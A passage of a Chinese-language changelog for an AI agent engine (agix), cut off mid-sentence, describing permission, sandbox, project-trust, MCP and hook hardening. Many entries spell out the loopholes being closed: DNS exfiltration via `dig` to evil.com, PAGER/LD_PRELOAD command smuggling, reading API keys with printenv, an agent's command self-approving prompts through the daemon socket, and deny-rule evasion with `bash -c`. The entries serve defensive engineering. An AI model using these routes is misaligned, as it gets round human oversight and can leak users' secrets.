- 只读命令参数里的 glob 按它此刻在磁盘上匹配到的路径检查:`cat .*/x`(macOS 的 bash 3.2 让
  `.*` 匹配 `..`)、`cat link*/x`(符号链接指到项目外)要询问,匹配超过 512 个路径的也询问。
  `cd -` / `popd` 之后再 `cd` 一个相对路径,不再当作回到了已知的目录。
- 只读白名单里会**拉起别的程序**的命令不再免询问:`rg --pre` / `--search-zip` / `-z`、
  `fd -x` / `-X` / `--exec` / `--exec-batch`、`git grep -O`、`man -P` / `-H`、`bat --pager`、
  `sort --compress-program`,以及 `git -c …`(能设 `core.pager` / `core.fsmonitor` / 外部 diff)、
  `git log --ext-diff`。`cargo build` / `cargo check`(会跑 `build.rs` 与过程宏)移出只读前缀。
  设 `PATH` / `LD_PRELOAD` / `DYLD_INSERT_LIBRARIES` / `PAGER` / `MANPAGER` / `GIT_PAGER` /
  `LESSOPEN` 等变量(`PAGER=sh man ls`、`PATH=.; ls`)也一样要询问。
- 只读白名单里会**写文件 / 改仓库**的命令不再免询问:`sort` / `shuf` / `tree` 带 `-o`、
  `uniq` / `xxd` 带第二个位置参数、`yq -i`,以及 `git config` 带值(或 `--unset` / `--add` /
  `--edit` / `set`)、`git branch -d/-D/-m/-f/-u/<新名>`、`git tag -d/<新名>`、
  `git remote add/remove/set-url/rename/prune`、`git diff/log/show --output`。`git config key`
  (读)、`git branch` / `git tag` / `git remote` 的列示形式仍是只读。
- `dig`、`ping`、`nslookup`、`traceroute` 移出只读白名单,走正常的权限判定(`default` 下询问)。它们按参数里的主机名发 DNS 查询,`dig <编码后的数据>.evil.com` 就能把数据带出去。要免询问的,写 `Bash(dig:*)` / `Bash(ping:*)` 这类 allow 规则。
- `cargo metadata`、`cargo tree`、`cargo --version` / `cargo version`、`rustc --version`、`rustup show` 移出只读前缀:前两个要问 rustc,项目的 `.cargo/config.toml` 能把它换成任意程序(`build.rustc-wrapper`,`cargo metadata` 还会写 `Cargo.lock`);后几个跑的是 `rust-toolchain.toml` 指定的工具链,它可以是一个路径。要免询问的,写 allow 规则。
- **`acceptEdits` 不再放行发往未列出主机的 `WebFetch` / `Ping`。** 只有 `sandbox.allowed_domains`
  列出的主机(含子域)免询问,其余与 `default` 一样询问——URL 本身就能把数据带出去。
  其余只读调用照旧放行(含读项目外的文件)。
- `plan` 模式下,只读工具自己没放行的调用改为询问,与 `default` 相同:读项目外的文件、
  `WebFetch`、只读的 MCP 工具、参数指向项目外的只读 `Bash`。以前 `plan` 对只读工具一律放行。
- `Monitor` 不再恒为只读,按它的命令用 `Bash` 的只读分类判:跑脚本、起服务的 `Monitor` 在
  `plan` 下被拒,在 `acceptEdits` 下要询问(以前两处都静默放行)。
- 无人值守会话里,`Monitor` 的脚本在 OS 沙箱完整生效时自动放行(与 `Bash` 同一条件),以前恒为
  询问、也就是恒被拒。新设置 `sandbox.unattended_requires_network_policy`(缺省 `false`)打开后,
  `Bash` 与 `Monitor` 的这条自动放行另外要求 `sandbox.network_mode` 不是 `unrestricted`——沙箱只限写,
  网络仍是个口子;不满足就回到 allow 规则。计划在后续 0.3.x 把缺省改成 `true`,无人值守跑命令的部署现在就可以
  把网络收成 `deny_all` / `allowlist` 并打开它。
- 子进程环境永远不带 `CDPATH`(`inherit` 与 `allowlist` 两种模式都剥掉),免得子 shell 的
  `cd foo` 落到项目外、而权限检查看的是字面 `foo`。
- 沙箱里命令的 `TMPDIR` 从 `<系统临时目录>/agix-<会话 id>` 挪到 `<状态目录>/tmp/<会话 id>`
  (缺省 `~/.agix/tmp/<会话 id>`),只有本会话的命令写得到;以前在 macOS 上它落在所有沙箱命令
  都可写的 `DARWIN_USER_TEMP_DIR` 里,会话之间彼此可写。7 天没动过的会话临时目录由之后的进程
  清掉。
- 写工具(`Write` / `Edit` / `NotebookEdit`)拒写的名单多了 `.envrc`,以及 `.agix` / `.claude`
  下的 `mcp.local.json`;与 `settings.json` 一样可用 `sandbox.allow_write` 开例外。
- 沙箱里的命令对 `.claude` 与 `.agix` 一视同仁:`.claude` 目录项本身、其下的 `settings*.json`、
  `mcp.local.json` 与 `hooks`、`agents`、`skills` 等配置目录(名单见 ARCHITECTURE §6.3)不可写;
  macOS 上不存在的 `.claude` 也建不出来。
- 子进程(`Bash`、`Monitor`、command hook、MCP stdio 服务)的环境里不再有 provider 的 key:
  任何一层设置里 provider 的 `api_key_env` 指向的变量(如 `DEEPSEEK_API_KEY`)与 `ANTHROPIC_*`
  一样剥掉。以前只剥 `ANTHROPIC_*`,别家 provider 的 key 一句 `printenv` 就读得到。确实要把它交给
  子进程的,写进 `sandbox.subprocess_env.allow`。引擎自己跑的 git(及仓库配置让它起的程序)
  同样不带这些变量。
- 无人值守会话的 `Bash` / `Monitor` 不能再请系统服务在沙箱外代办:macOS 上 `open`(经
  LaunchServices 起应用、开 URL)、`defaults write`(经 `cfprefsd` 写偏好)、`osascript` 给别的应用
  发 Apple event 都会失败;Linux 上命令进独立的 IPC 命名空间,会话 D-Bus 与 systemd 用户实例的
  socket 被遮住(`systemd-run --user`、`gdbus call --session` 失败)。有人值守的会话不变。
- **daemon 不再服务它自己起的进程。** Unix socket 上的对端是 daemon 的子孙(模型调用的
  `Bash` / `Monitor`、command hook、stdio MCP 服务器,以及它们留在后台、还在 daemon 起的进程组里
  的进程)时,daemon 回一帧 `UNAUTHORIZED`(-32003,`id: null`)就关连接。沙箱里的命令另外连不上
  状态目录下的任何 unix socket 和 daemon 监听的 socket(`--socket` 放在哪都算;macOS 拒绝
  connect,Linux 把 `/dev/null` 挂在 socket 文件上),macOS 上也连不上 daemon 的 TCP / WebSocket
  端口。以前模型的一条命令就能连上 socket,以宿主身份 `mcp.addServer`、`project.trust`、
  `session.respondToPrompt`。让 hook 或 MCP 服务器回调 daemon 的,改由宿主转一手。`--token`
  写在命令行上时 `ps` 里看得见,Linux 上沙箱里的命令可以拿它连 TCP 端口——用
  `AGIX_DAEMON_TOKEN` 传。
- agent 类型 frontmatter 的 `permission_mode` 真正作用到子 Agent 的权限判定上(以前写 `plan`
  不起作用),可以比父会话宽也可以严;父会话在 `plan` 时取两者中更严的那个,父会话是
  `bypassPermissions` 时随父会话,插件带来的类型只能收紧。团队成员(`TeamCreate`、`Agent` 的
  `team_name`)继承父会话的全部规则,模型要的 `permission_mode` 只能收紧,询问到父会话的宿主
  那里问。以前成员没有任何规则,`bypassPermissions` 整队免确认。
- 子 Agent 的询问等待上限跟会话的 `--permission-prompt-timeout`,不再固定 300 秒;在子 Agent 的
  询问上答 `permit_always`,记下的是那一条命令或路径,不再是整个工具。
- 子 Agent 能改它自己读过的已有文件了:以前读后再写的检查查的是父会话的读取记录,子 Agent 的
  `Edit` / `Write` 改已有文件总被"File must be read before editing"拒掉。
- `permit_always` 的 `local` 第一次建出 `settings.local.json` 后,之后新建的会话不用
  `config.reload` 就能看到那条规则。

#### 项目信任

- **项目信任(`ARCHITECTURE.md` §6.6)。** 全局设置多了 `project_trust: { default, trusted }`。
  没被信任的项目按插件级信任处理:它的 `permission_mode` / 规则 / 沙箱设置只能收紧,
  `hooks_config`、`mcp_servers`、`scripts` 不生效,`.agix/hooks/` 不进 hook 的 `PATH`,
  `.agix/agents/` 里的类型只能收紧、不替换同名类型,`.agents/skills/` 里的 `` !`cmd` `` 不执行。
  **0.3.10 缺省 `default: "trusted"`,什么都不变**;`daemon.doctor` 多了一项 `project.trust`,
  项目里有要信任才生效的东西而只靠缺省被信任时报 `degraded`,把它们列出来。
  `project_trust` 只从全局层读,场景层、项目层里写的忽略。
- 未信任的项目同样扣下决定东西送到哪里的键:`providers`(整段)、指向项目自己 provider 的
  `default_provider` / `task_models` 条目、`model.base_url` / `model.auth_token`、`telemetry_url`、
  `recorder`、`instruction_file`,以及放进更多插件的 `plugins` 值;它的 skill 的 `allowed-tools`
  不授予任何东西;全局层、场景层里相对路径的脚本绑定在未信任的项目里不绑定。全局层、场景层和插件的 stdio MCP server 在未信任的项目里以全局配置目录为工作目录启动(相对的 `command`、参数里的相对路径在那里解析),不再继承 daemon 的工作目录。这些都列进
  `requires_trust`,所以只改了 `providers.*.base_url` 的仓库也会让宿主弹出信任对话框。
  **自己往项目层写 provider、模型端点的部署**(在项目的 `.agix/settings.json` 里写 `model`、
  `providers` 的宿主)在缺省翻转之前要把这些项目目录写进 `trusted`,否则翻缺省之后它们不生效。
- **未信任的项目里,command hook 不以相对路径起程序。** 全局层、场景层的 hook 写
  `./scripts/check.sh`、`scripts/x.sh`、`bash x.sh`、`. ./env.sh` 的,在未信任的项目里不跑,算
  hook 失败(`on_error` 照旧);继承的 `PATH` 里的 `.` 与空条目也不给它们用。以前它们在项目目录里
  执行,跑的是仓库放在那个路径上的文件。自己的脚本改写绝对路径或放进 `~/.agix/hooks/` 写裸名;
  信任的项目不变(0.3.x 缺省信任)。
- **计划在后续 0.3.x 把 `project_trust.default` 改成 `untrusted`**(见本节末"计划中的缺省变化")。现在就该做的:桌面宿主在打开项目时
  调 `project.status`,`requires_trust` 不空就问用户、用 `project.trust` 记下回答;自己创建项目
  目录的无人值守部署(写项目层 `mcp_servers` / `permission_mode` 的那种)在全局
  `settings.json` 里写 `"project_trust": {"trusted": ["<项目目录>/**"]}`。可以先把 `default` 设成
  `untrusted` 试跑,`daemon.doctor` 与 `project.status` 会说哪些东西被扣下了。
- 设置文件里一个值类型不对(`"language": 5`)不再让整份合并结果退回内建缺省(连全局层的 hook、
  沙箱设置一起丢掉):只丢这个值,warn 一条,`daemon.doctor` 的 `settings.tiers` 报 `degraded`,
  `settings_tiers[].ignored_values` 列出它。以前靠"写错一个值就等于什么都没配"的,现在其余的
  值都生效。

#### MCP 与 OAuth

- **MCP 的 OAuth 换了一套**(`mcp_auth.md`)。`mcp_servers` 里的 `oauth_provider` 删除:写了它
  的 server 配置整条被拒绝(启动与重载时发 `mcp_connect_failed`,`mcp.addServer` 报
  `INVALID_PARAMS`),报错里给出新写法。改成 `"oauth": {"client_id", "client_secret_env",
  "scopes", "callback_port"}`(都可省);只是想让要求登录的 server 能登录,什么都不用写。
  以前 `oauth_providers` 里的密钥字面量没有对应写法:放进环境变量,`client_secret_env` 写变量名。
  以前存在 `scenes/<id>/mcp/oauth/<provider>.json` 的令牌不再读取,要重新登录一次。
  授权服务器(元数据、issuer、注册、令牌、吊销端点)必须是 `https`,只有回环地址上的可以用
  `http`;私网里明文 `http` 的 MCP server 或授权服务器不再能走 OAuth。
- 传输错误不再清掉 OAuth 令牌(以前任何一次重连都会清);`mcp.addServer` / `mcp.updateServer`
  加进来的 server 和启动时连的一样走 OAuth。
- 无人值守的 MCP server:`oauth.grant` 为 `client_credentials`(`client_secret_env` 或
  `private_key_jwt`)或 `enterprise`(企业托管授权;身份经新方法 `mcp.auth.setIdentity` 给)。
- MCP 策略文件多了两个可选键:`allowed_authorization_servers`(授权服务器 issuer 的 glob)与
  `enterprise_idp`。`daemon.doctor` 的 `mcp.policy` 详情相应多了这两项。
- **MCP 策略里 `allowed_servers` 的 `name` 规则不再放行任何 server**,`name` 只在
  `denied_servers` 里起作用。只靠 `{"name": …}` 放行的策略现在拒绝这些 server(拒绝原因会说
  明),`daemon.doctor` 的 `mcp.policy` 报 `degraded` 并在 `inert_allowed_rules` 里列出它们;
  改成 `command` / `url` 规则。`url` 规则匹配前把 `ws://` / `wss://` 当作 `http://` /
  `https://`、去掉主机名末尾的 `.`(规则里写的 `ws://` / `wss://` 同样换过来),
  `denied_servers` 因此也拦得住 WebSocket 回退和 `evil.example.` 这种写法。
- **项目层的 MCP server 读不了 daemon 的环境。** 项目 `.agix/settings.json` /
  `settings.local.json` 里声明或改过的 server——包括 `mcp.addServer` / `mcp.updateServer` 写进去
  的——`command` / `args` / `url` / `headers` 里的 `$VAR` 只用它自己 `env` 块的值展开,`env` 块
  的值本身不展开;`oauth` 里写 `client_secret_env` / `private_key_jwt.key_env` 的不连接
  (`mcp_connect_failed`,`mcp.addServer` 报 `INVALID_PARAMS`)。靠 `$GITHUB_TOKEN` 这类变量的
  项目 server,把值写成字面量,或把 server 挪到全局层 / 场景层;全局层、场景层、插件声明的
  server 照旧。项目放在 `$HOME`、`.agix` 就是全局目录的,按全局层算。
- `"type": "in_process"` 的 MCP server 配置不再被接受(从来没有实现过,连接必然失败),以
  `invalid config` 报出。`"type": "websocket"` 现在与 `web_socket` 同义。
- **MCP 工具名按 API 的规则造。** 工具名(与 prompt 斜杠命令)是 `mcp__<server>__<tool>`,两段里 `[A-Za-z0-9_-]` 以外的字符换成 `_`;server 名有这种字符或长过 40 的,后面再接 `_` 加六位哈希(`my server` → `mcp__my_server_<hash>__…`);server 名含 `__` 或以 `_` 结尾的同样走这条(`a__b` 的工具叫 `mcp__a_b_<6 位哈希>__…`),本来就要哈希、清洗后以 `_` 结尾的名字(如 `docs.`)不再带那个 `_`;整个名字超过 64 时工具段截短并接哈希。只用这些字符、不长的 server 名不变。名字怪的 server,权限规则要跟着新名字写,`MCP` 工具会列出每个工具的名字。工具的 `inputSchema` 顶层不是 `type: object` 的,按 object 报给模型。
- **MCP 有了时限。** `mcp_servers.<name>` 可带 `startup_timeout_ms` / `tool_timeout_ms`;
  缺省取环境变量 `MCP_TIMEOUT` / `MCP_TOOL_TIMEOUT`,再缺省 30 秒 / 10 分钟。握手不回、只回
  非 JSON 的 server 到时被停掉、报 `mcp_connect_failed`,不再把会话创建卡死;工具调用超时在
  server 端取消,报错。会话创建最多等 MCP 10 秒,没连完的后台接着连,连上后发 `mcp_connected`,
  会话在下一轮前换上。
- **MCP 工具调用断在途中不再重发。** server 在调用中途退出,这次调用报错(以前重连后再发一次,
  有副作用的工具会执行两遍);下一个请求重连。
- 工具调用之后不再把每个 MCP server 的工具都重列一遍:只有发了 `tools/list_changed`(或断线
  后重连上)的 server 才在下一步重列,发了 `prompts/list_changed` 的重读它的 prompt;
  `resources/list_changed` 不触发任何事。重列失败的 server 保留原来的工具,不再让整组工具
  消失;重列得到空列表的,工具清空。
- `config.reload` 的 `routing` 多了 `mcp_connecting`:重连最多等 10 秒,没连完的在后台接着连,
  结果随后以通知到达。命令不存在、没有执行权限、URL 解析不了的 MCP server 不再退避重试
  (以前每个要等十几秒)。
- 消息里 `@server:uri` 内联的资源:`server` / `uri` 属性做了转义,正文里的 `</mcp-resource`
  被拆开,资源伪造不了闭合标签;MIME 不是 `image/*` 的二进制资源显示为
  `[binary resource: <mime>, <n> bytes]`,不再标成图片。
- MCP OAuth 回调带 `error` 时同样要求 `state` 相符;不符的被拒,登录继续等真正的回调。以前
  任何本机进程发一个 `?error=x` 就能把进行中的登录作废。
- MCP stdio server 的进程组记进孤儿登记:daemon 被 `SIGKILL` 之后,下次启动会把它们清掉。
- 只读且幂等的 MCP 工具结果超过 256 KB 的不再缓存。
- 登录之后重连失败的 `mcp_connect_failed` 的 `error` 带上失败原因。
- 无人值守的 MCP server(`client_credentials`、`enterprise`)拿到的令牌寿命短于 30 秒左右时,
  调用不再间歇地以"需要授权"失败:令牌何时重新取由 daemon 决定,底层的 OAuth 客户端不再因为
  它"快到期"而拒绝使用刚取到的令牌。
- MCP server 返回的单张图片解码后超过 3.5 MB 的,换成一行 `[image omitted: …]`,不再原样
  转给模型(超过 API 的单图上限,这一请求和之后每一个带着它的请求都会被拒)。`Read` 读超过
  3.5 MB 的图片同样报错,不再按 10 MB 的读文件上限放行。

#### hooks

- **command hook 的退出码按 0 / 2 / 其他来读**(`extension_points.md` 生命周期 hook 一节)。
  `exit 2` 一律拦下,理由取 stderr(为空取 stdout),stdout 不再当 JSON 读——以前 `exit 2`
  同时往 stdout 打了不是 JSON 的东西就被放行。`exit 1` 等其他非零放行并记 warn——以前
  非零退出、stdout 为空就拦下。靠 `exit 1` 拦的 hook 改成 `exit 2`。
- 没写 `timeout` 的 hook 最多跑 60 秒(以前 10 分钟);agent 型 hook 的 `timeout` 以前不生效,
  现在生效。要更久的写明 `timeout`。
- **hook 的 `if`**(`hooks.md`"`if`"一节)对 `Bash` / `Monitor` 按实际启动的程序比,与 deny 规则同一套读法:`Bash(rm:*)` 现在也命中 `cd . && rm x`、`"rm" x`、`/bin/rm x`、`env rm x`、`bash -c 'rm x'`,以及程序名读不出来的命令(`$CMD x`)。以前只比整行原文的前缀,这些都绕得过;配了这类 `if` 的 hook 会比以前跑得多。另外 `""` 与 `"*"` 命中一切(以前什么都不命中,hook 从不跑);`Edit|Write` 几选一;prompt、http、agent 三种 hook 也认 `if`(以前被忽略,对所有调用都跑)。
- `once` 只在 hook 真正跑了之后才算用掉;以前 `if` 没命中的那次调用就把它用掉了。
- 超时、出错的 hook 在日志里记一条 warn(以前除了 command 超时都没有痕迹)。
- **hook 的批准。** `PreToolUse` hook 答 `decision: "approve"` 就不再问人:权限检查要询问的调用直接放行(无人值守会话同样),规则拒绝的照样拒绝,别的 hook 说 `block` 照样拦;以前 `approve` 解析了但不起作用。这对 `command` 与 `http` hook 成立;**`prompt` / `agent` hook 的批准缺省不算数**——模型回 `"decision": "approve"`、子 Agent 回 `"ok": true`(记为 `approve`)不会替人答应权限询问(以前会,无人值守也一样),询问照常发给宿主。要它算数的,在那条 hook 上写 `"may_approve": true`。它们说 `block` / `ok: false` 照旧拦下。
- **`Stop` hook 的 `decision: "block"`(或 command `exit 2`)不再被忽略**:这一轮不结束,
  `message` 作为提醒交给模型接着做;再停下时 `Stop` 再问一遍,payload 带 `stop_hook_active: true`。
  只想记录的 `Stop` hook 若回了 `block`,现在会让模型多跑一轮。
- **`TaskCompleted` 在任何运行中任务结束时都发**(完成、失败、被停下),与 `TaskCreated` 成对,`reason` 是这个任务的 JSON(`task_id`、`kind`、`status`……)。团队成员(`TeamCreate` 的、`Agent` 带 `team_name` 的)一轮正常结束时另发一次 `TaskCompleted`,payload 带 `team_name`、`teammate_name`;`TeammateIdle` 在同一时刻发,也带这两项。两者都不再要求配了 `Stop` hook。只想要团队成员那次的 hook,看 payload 里有没有 `team_name`,或改用 `TeammateIdle`。
- 子 Agent 用父会话的 hooks:`once` 在整棵会话树里只算一次(以前每个子 Agent 各算一次),
  `FileChanged` 一次修改只触发一次(以前每起过一个子 Agent 就多触发一次)。`SubagentStart` /
  `SubagentStop` 在后台 `Agent`、`context: fork` 的 skill、`session.startAgent`、常驻团队成员上
  也会发(以前只有前台 `Agent` 与 `TeamCreate`);常驻成员的 `SubagentStop` 在它被停掉时发,
  `stop_reason` 为 `shutdown`;取消的子 Agent 报 `cancelled`。
- `FileChanged` 也监视会话载入的 `AGENTS.md`(以前只看显式的 `instruction_file`)。
- hook payload 的 `permission_mode`、`cwd` 不再为空:工具分发里发的 `PostToolUseFailure`、
  `PermissionRequested`、`PermissionDenied`、`Notification`、`WorktreeCreate/Remove` 以及
  `TaskCreated` 带上会话当前的模式;`SubagentStart/Stop` 带子 Agent 自己的 cwd 与模式;
  `FileChanged`、`Elicitation` 与 rewake 的 `WakeEvent` 带上会话 id、项目根与模式(以前
  `session_id` 为空、`cwd` 是 daemon 进程的工作目录或空、模式写死 `default`)。
- `agent` hook 的 `model` 生效:子 Agent 跑在这个模型上,按会话的路由选 provider。以前这个字段
  被忽略,子 Agent 用会话的模型。
- hook 回答里的 `suppress_output` 不再是一个字段(写了也不报错):引擎从不把 hook 的 stdout
  交给模型或宿主,没有可隐藏的。
- `async_rewake` 在 daemon 里生效:会话的运行中任务(子 Agent、后台命令、Monitor)有一个结束,
  就算唤醒信号,等着的 hook 在会话处理下一条输入之后、等再下一条之前重跑。以前 daemon 不接
  唤醒通道,这类 hook 永远不会重跑。
- hook 新增 `on_error`(四种后端都认):缺省 `"allow"`,失败照旧放行;写 `"block"` 的,超时、
  出错、command 退出码不是 0 或 2、回答不是 JSON,都等于它回答了 `decision: "block"`,理由写明
  是哪个 hook、怎么失败的(`hooks.md`"失败"一节)。
- HTTP hook 防内网的检查补全:`0.0.0.0`、`[::ffff:127.0.0.1]`、`127.1`、十进制写法、带
  `user@` 的 url、IPv6 私有段与 CGNAT 都拒;重定向的每一跳都查。
- HTTP hook 新增 `allow_local`(缺省 `false`):写 `true` 的可以指向本机或内网,只放开 url 里的
  主机与端口,重定向到别的内部目标照旧被拒。

#### 模型与回合

- 模型调用的恢复对真实厂商生效了:过载(重试用尽的 529,或流里的 `overloaded_error`)配了
  `model.fallback_model` 就换它重发;尺寸被拒(400「prompt is too long」、413、流里的同类错误)
  压缩后重发。以前这些都直接以 `ENGINE_ERROR` 结束。
- 模型请求在开始回答之前收到 500 / 502 / 504 / 408 的,按退避再发(两个协议都是),和 429、
  503、529 一样;以前直接失败。
- Anthropic 的 `base_url` / `ANTHROPIC_BASE_URL` 写到 `…/v1` 或写全 `…/v1/messages` 都可以,
  不再拼成 `…/v1/v1/messages`。
- OpenAI 兼容 provider 报回的 `input_tokens` 不再含已缓存的那部分(那部分在
  `cache_read_input_tokens`),和 Anthropic 的含义一致;以前缓存命中的部分算了两遍,
  `context.tokens` 与按 token 估的花费都偏大。
- Anthropic 原生搜索不再带 `anthropic-beta: web-search-20250305-2025-03-05`(`web_search_20250305`
  不需要 beta)。
- `pause_turn` 不再结束一轮:引擎把那条回复发回去让模型接着写。
- 一次调用在回复要工具之前失败,它推过的 `text_delta` 不进 transcript;重发前会再发一次同
  `step` 的 `step_start`(协议 §7)。流在消息结尾之前断开,以前当作一个空回答正常结束
  (`stop_reason` 为空、用量为 0),现在是 `ENGINE_ERROR`。
- 并发安全的工具在它的 `tool_use` 到齐时就开始跑,`tool_result` 与权限询问可能夹在同一步后面的
  `text_delta` 之间到达。
- 参数不是完整 JSON 的工具调用(多半是回复撞上输出上限被截断)不再以空参数 `{}` 去跑:
  不派发,直接给它一条 `is_error` 的 `tool_result`,说明参数不完整并附上收到的开头,模型下一步
  重新调用。`tool_use` 帧的 `input` 是 `{}`。以前这类调用拿空参数照常执行。
- 不并发安全的工具(屏障)运行期间引擎照样读模型的流,读到的等它跑完再处理;以前这段时间
  不读,长时间运行的工具让厂商那边的连接空等。
- 工具调用里的 panic(只在 `panic = "unwind"` 的构建,如 `release-fast` 与 dev)变成这次调用的
  错误结果,这一轮照常往下走;以前它让整轮失败。`release` 构建照旧中止进程。

#### 压缩与记忆

- 尺寸被拒之后的压缩和别的压缩是同一次压缩:跑 `PreCompact` / `PostCompact` hook
  (`trigger` 为 `"auto"`,hook 拦下就不重发、这一轮以 `ENGINE_ERROR` 结束)、配了摘要模型时
  先写摘要、补回读过的文件等提醒;被压掉的开场上下文(AGENTS.md / CLAUDE.md)下一轮重新注入。
  以前这条路径跳过了这些,开场上下文被压掉后整个会话再也不注入。
- 自动压缩把对话压到阈值减去系统提示词与工具定义之后剩下的大小。以前压到阈值本身,压完
  整个请求仍在阈值之上,之后每一步都再"压"一次:什么都丢不掉,却照样补回读过的文件、发
  `strategy: "NoOp"` 的 `compact` 帧,上下文越压越大。现在没有可丢的就什么都不做、不发帧;
  压完反而更大的(补回的提醒比丢掉的多)也不生效。`compact` 帧的 `tokens_after` 含补回的
  恢复消息。
- 开了 `compaction.reactive` 时,轮中提前清掉旧工具结果的那一趟发 `compact` 帧
  (`MicroCompact`,消息条数不变)。以前只记日志。按时间清掉旧工具结果(默认开:会话不少于
  100 条消息时清 15 分钟以前的)同样发这一帧,以前也只记日志。
- 压缩不再丢掉之前的摘要:没有摘要模型时(或摘要失败)的第二次压缩保留第一次留下的摘要,
  不再把它当作最旧的一轮删掉、或截成 200 字节。
- 工具结果预算按字符计:单条过 50,000 字符的保留前 1,000 字符,截断说明改为
  `[Tool result truncated: N characters > 50000 max; first 1000 characters preserved]`。以前按
  字节计,两万个汉字(60 KB)的结果就被截成 1,000 字节;`WebFetch` 截到 50,000 字符的页面
  同样被截。工具带回的图片也算进累计的 500,000(每张按 6,400 字符),超了从最旧的清起,
  清掉的图片换成一行 `[Old tool result image cleared]`。
- **记忆目录只有两处**:全局 `<状态目录>/memory/`(模型照提示词写的地方)与项目的
  `<项目>/.agix/memory/`(抽取出的 `type: project`)。以前另外读的
  `<状态目录>/memory/<cwd 的哈希>/MEMORY.md` 与 `<状态目录>/memory/<改写过的 cwd>/*.md`
  不再读——引擎从不往那里写;手放过文件的,挪进 `<项目>/.agix/memory/`(带 frontmatter
  的记忆格式)或项目的 `AGENTS.md`。
- 提示词 `# Memory` 一节的索引是两处 `MEMORY.md` 合起来的,项目级的记忆也列得出来;
  `memory_enabled: false` 时声明式场景的 `memory` 提醒也不再带索引。内置场景的每轮提醒
  不再重复带索引(提示词里已经有)。
- 记忆写入不再写出半截文件:按目录串行、先写临时文件再改名;召回计数在同时召回时不丢。
- 轮末抽取的记忆里认出密钥(`sk-…`、`ghp_…`、`AKIA…`、Bearer、JWT、私钥头……)的,那一条
  不保存。记忆存到 200 条就不再抽取新的(已有的照常更新),记一条 warn,`daemon.doctor` 的
  `memory` 检查报 `degraded`(`count` / `cap`);引擎从不自动删记忆,腾地方要有人删掉一些。
- 召回超出 2 秒预算时,在途的选择调用被中止,不再在后台继续花 token。

#### 工具

- `Bash` 超时不再丢输出:命令被停掉前打印的内容照样返回,末尾标 `[timed out after Nms]`
  (`is_error`),结构化结果多了 `timed_out`。以前超时直接以错误结束,已打印的全丢了。
- `Bash` 单行超过 64 KB 时截断并标 `…[line truncated]`,然后继续读后面的行;以前到那一行就
  静默丢掉之后的全部输出。
- 工具 `VerifyPlanExecution` 删除:它要读的计划正文从没有地方写入,调用总是报
  "No active plan found"。
- `WebFetch` 的正文放在 `<external-content source="…">…</external-content>` 里,后面一句
  说明它来自网页、不是用户的话;整个结果(头、定界、正文)至多 50,000 字符,截断时注明页面
  原长。`Read` 读项目外(不在项目、可写目录、`sandbox.read_directories` 之下)的文件同样这样
  包起来;脚本里调用的 `Read` 不包。按结果前缀匹配的(`[HTTP 200`、行号)不受影响,按结尾
  匹配的要改。
- **`WebFetch` 的页面抽取改走 `task_models.web_fetch`。** 以前抽取从没接上:`prompt` 被忽略,工具描述与结果头(`mode=extracted-by-haiku`)却说页面经小模型处理,还承诺了 HTTP→HTTPS 升级与 15 分钟缓存,都没实现。现在只有 `task_models.web_fetch` 配了模型才抽取(按会话的路由与 provider 调,计入录像与用量;不退回会话主模型;页面截到 80,000 字符,输出上限 2048),没配就返回页面文本。结果头报实际模式 `extracted by <模型>` 或 `page text`,抽取失败或答空时退回页面文本并在头里写明原因。重定向不跟随,返回目标。按 `mode=extracted-by-haiku` 匹配结果头的要改。
- **`WebFetch`、`Ping` 不再能连本机与内网**:回环、私网、链路本地(含云元数据
  `169.254.169.254`)、CGNAT、`0.0.0.0`、IPv4 映射的 IPv6 等地址,写成 IP 的、名字解析到的、
  重定向过去的,都报 `Denied`。要让它们够到本机或内网的某个主机,把主机写进
  `sandbox.allowed_domains`(如 `"127.0.0.1"`、`"intranet.corp"`);`network_mode` 是缺省的
  `unrestricted` 时这份列表不限制别的主机,只起放行内部地址的作用。
- `Grep` 搜 32 MiB 以内的文件(以前 4 MiB),更大的不读,结果末尾列出被跳过的文件;以前静默
  跳过,报 no matches。`multiline: true` 时 `.` 匹配换行,content 模式给出匹配跨过的每一行。
- 定时任务的 cron 表达式一直按 UTC 匹配,`CronCreate` 的说明现在也这么写,结果里带当前
  UTC 时间。`scheduled_tasks.json` 改为原子写;读不出来的文件挪到 `scheduled_tasks.json.corrupt`
  再从空表开始,不再被下一次保存覆盖。
- `ExitWorktree` 的 `keep` 真的结束 worktree 会话(worktree 留在磁盘上),之后可以再
  `EnterWorktree`;以前会话一直留在里面,下一次进入被拒。`remove` 因为有未提交改动被拒时会话
  仍在 worktree 里,带 `discard_changes` 重试能删掉(以前 worktree 成了孤儿)。分支上有别的
  分支与远端都没有的提交时同样拒绝删除。
- skill 正文里的 `` !`cmd` `` 先过会话权限(按一次 `Bash` 调用):被 deny 规则拒的、要询问的
  不再执行,替换成写明原因的一行文字。要它照跑,给那条命令写 allow 规则;项目内的只读命令照旧
  直接执行。skill 自己的 `allowed-tools` 不覆盖它自己的 `` !`cmd` ``。
- 运行中新建或改动的 `<project>/.agents/skills/` 下的 skill 按项目 skill 对待(不带内容的
  `allowed-tools` 授权不生效),即使用户层有同名的 skill。以前热重载把它记成用户 skill。
- skill 文件热重载时按文件所在的层定来源:项目层 `.agents/skills/` 里新出现或改动的 skill
  一律是 project 来源(以前不认识的名字一律当 user,项目里的 `allowed-tools: [Bash]` 因此免确认);
  不在任何扫描层下的文件同样按 project;后面的层占着同名 skill 时,前面层的改动不再顶替它;
  `skills/<name>/` 下 `SKILL.md` 以外的 `.md` 不再被注册成 skill。
- `skills_changed` 真的会发了:skill 文件在两轮之间增删后,下一轮开始时每个受影响的会话发一次,
  模型同时收到一条提醒。以前 daemon 就地换了 skill 目录,这个帧从来不发。
- skill frontmatter 的列表不在括号里切分:`allowed-tools: Bash(sh build.sh)` 不写成 `[列表]`
  也是一条授权(以前切成 `Bash(sh` 与 `build.sh)`,授权失效)。
- `/name` 斜杠命令展开 skill 与 `Skill` 工具完全一样:执行 `` !`cmd` ``(同样先过会话权限)、
  正文截到 8000 字符、接上 `files:`、`allowed-tools` 授权到这一轮结束、计入调用次数。
  `context: fork` 的 skill 交给子 Agent 的正文也执行 `` !`cmd` ``、同样截断。展开出的正文
  不再带 frontmatter(以前磁盘上的 skill 连 `---` 头一起交给模型)。
- 插件包带来的 skill 与项目 skill 一样,只写工具名的整类 `allowed-tools` 授权不生效,要写成
  `Tool(内容)`。
- `Agent` 工具的 schema 去掉从未生效的 `auto_background_after_secs`。子 Agent 因 `max_turns`
  停下时,交回父会话的结果里写明这一点(以前可能是一个空结果)。`TeamCreate` 的结果不再带
  协调者的 ROLE/TOOLS 说明段。
- 在会话自己的工作树(`EnterWorktree` 建在 `.agix/worktrees/<名字>/` 下)里写文件、跑命令
